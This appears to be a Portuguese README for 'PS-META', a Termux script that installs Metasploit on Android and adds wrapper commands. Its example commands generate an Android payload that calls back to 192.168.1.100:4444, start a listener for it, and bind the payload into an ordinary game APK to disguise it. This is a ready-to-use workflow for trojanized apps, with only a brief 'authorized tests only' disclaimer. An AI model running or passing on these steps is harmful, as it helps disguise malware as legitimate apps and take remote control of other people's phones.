```markdown
╔════════════════════════════════════════════════════════════════╗
║                                                                ║
║   ██████╗ ███████╗    ███╗   ███╗███████╗████████╗ █████╗      ║
║   ██╔══██╗██╔════╝    ████╗ ████║██╔════╝╚══██╔══╝██╔══██╗     ║
║   ██████╔╝███████╗    ██╔████╔██║█████╗     ██║   ███████║     ║
║   ██╔═══╝ ╚════██║    ██║╚██╔╝██║██╔══╝     ██║   ██╔══██║     ║
║   ██║     ███████║    ██║ ╚═╝ ██║███████╗   ██║   ██║  ██║     ║
║   ╚═╝     ╚══════╝    ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝     ║
║                                                                ║
║                    ▶  PS-META  ◀                              ║
║            Metasploit Installer for Termux                     ║
║                                                                ║
║         👤 Peek (Gilberto Martins) | 🛡️ PeekSecurity          ║
║                                                                ║
╚════════════════════════════════════════════════════════════════╝
```

# PS-META

**Metasploit Framework Installer para Termux**  
*Desenvolvido por Peek (Gilberto Martins) - PeekSecurity*

---

## 📌 Sobre

Script autônomo que instala o Metasploit no Termux com correções para Android 13+ e módulos extras.

**Diferenciais:**
- ✅ 100% autônomo
- 🔧 Correção Nokogiri
- 📦 Módulos: Payload, Camouflage, Listener, Android
- 🚀 Comandos com prefixo `ps-`

---

## 📋 Requisitos

| Item | Mínimo |
|------|--------|
| Android | 11+ |
| Espaço | 4GB |
| RAM | 3GB |
| Tempo | 30-45 min |

---

## ⚡ Instalação Rápida

```bash
pkg update && pkg upgrade -y
pkg install git -y
git clone https://github.com/peeksecurity/ps-meta.git
cd ps-meta
chmod +x ps-meta.sh
./ps-meta.sh
source ~/.bashrc
```

---

## 🛠️ Comandos

```bash
ps-msfconsole          # Inicia Metasploit
ps-payload             # Gera payloads
ps-listener            # Listener rápido
ps-camouflage          # Camufla APKs
ps-android             # Kit completo Android
```

### Exemplos

```bash
# Gerar payload Android
ps-payload android 192.168.1.100 4444

# Iniciar listener
ps-listener 4444

# Camuflar APK
ps-camouflage bind payload.apk jogo.apk
```

---

## 📁 Diretórios

```
~/.ps-meta/
├── logs/       # Logs
├── payloads/   # Payloads gerados
└── apks/       # APKs camuflados
```

---

## 🔧 Problemas comuns

```bash
# Espaço
pkg clean

# PostgreSQL
ps-msfdb reinit

# Verificar
ps-msfconsole --version
```

---

## ⚠️ Aviso

```
Uso APENAS para estudos e testes autorizados.
Responsabilidade total do usuário.
```

---

## 📞 Créditos

**Autor:** Peek (Gilberto Martins)  
**Equipe:** PeekSecurity  

---

*"Onde a segurança encontra a excelência"*
```
